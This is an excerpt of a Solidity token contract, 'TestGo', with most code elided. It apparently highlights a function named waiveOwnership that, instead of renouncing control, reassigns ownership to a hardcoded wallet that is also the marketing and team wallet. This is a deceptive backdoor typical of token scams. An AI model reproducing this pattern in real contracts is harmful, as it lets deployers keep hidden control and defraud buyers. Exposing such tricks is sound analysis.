...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xA526A95D470E6A110C3b91194A0f90ad1FA7EDf3);
    }
...
contract TestGo is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "TestGo";
    string private _symbol = "Tgo";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xA526A95D470E6A110C3b91194A0f90ad1FA7EDf3);
    address payable public teamWalletAddress = payable(0xA526A95D470E6A110C3b91194A0f90ad1FA7EDf3);
